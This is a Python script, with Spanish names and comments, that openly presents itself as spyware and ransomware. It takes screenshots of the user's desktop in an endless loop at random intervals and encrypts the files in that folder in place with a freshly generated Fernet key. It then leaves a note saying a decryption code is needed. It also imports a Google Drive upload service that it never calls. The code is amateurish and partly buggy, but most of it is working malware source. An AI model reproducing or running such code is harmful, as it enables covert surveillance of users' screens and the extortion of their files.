import pyautogui
import getpass
import sys
import os
import random
import time



'''Nota: libreria para Ransomware'''
from cryptography.fernet import Fernet

from googleapiclient.http import MediaFileUpload
from Google import Create_Service



def GenerarLlave():
    llave = Fernet.generate_key()
    with open("llave.key", "wb") as archivo_llave:
        archivo_llave.write(llave)

def RetornarLlave():
    return open("llave.key", "rb").read()

def Encriptar(imagenes, llave):
    i = Fernet(llave)
    for x in imagenes:
        with open(x, "rb") as file:
            datos_archivos = file.read()
        datos = i.encrypt(datos_archivos)

        with open(x, "wb") as file:
            file.write(datos)

if __name__ == "__main__":


    carpeta = 'C:\\Users\\Equipo\\Desktop\\CapturasSpyware'
    imagenes = os.listdir(carpeta)
    carpeta_2 = [carpeta+"\\"+x for x in imagenes]


GenerarLlave()
llave = RetornarLlave()

Encriptar(carpeta_2, llave)




with open(carpeta+"\\"+"leame.txt", "w") as file:
    file.write("Archivos encryptados por seguridad...\n")
    file.write("Para acceder necesita el codigo de Desencryptacion")


ruta_carpeta = ""

usuario = ""


def SacarCapturas():
    
    print("Obtenemos el nombre del usuario del equipo...\n")
    
    usuario = getpass.getuser()
    
    print("Nombre del usuario: " + usuario + "\n")
    
    if sys.platform.startswith("win32"):
        
        print("Sistema operativo: windows \n")
        
        ruta_carpeta = "C:\\Users\\" + usuario + "\\Desktop"
        
        print("Verificando ruta de destino para las imagenes...\n")
        
        if os.path.isdir(ruta_carpeta + "CapturasSpyware\\"):
            
            print("El directorio ya existe....\n")
            
        else:
            
            print("Creando el directorio para las imagenes....\n")
            
            os.mkdir(ruta_carpeta + 'CapturasSpyware')
            
            print("Directorio creado satisfactoriamente")
            
        ruta_carpeta = ruta_carpeta + "\\CapturasSpyware\\"
        
        
    

    nombre_carpeta = "captura"
    

    while 1:
        
        print("Realizando captura de pantalla...\n")
        
        tiempo_random = random.randrange(4,6)
        
        time.sleep(tiempo_random)
        
        tiempo = time.time()
        
        ruta_final = ruta_carpeta + nombre_carpeta + "_" + str(tiempo) + ".jpg"
        
        captura = pyautogui.screenshot()
        
        captura.save(ruta_final)
        
        print("Captura de pantalla guardado en: " + ruta_final + "\n")



SacarCapturas()

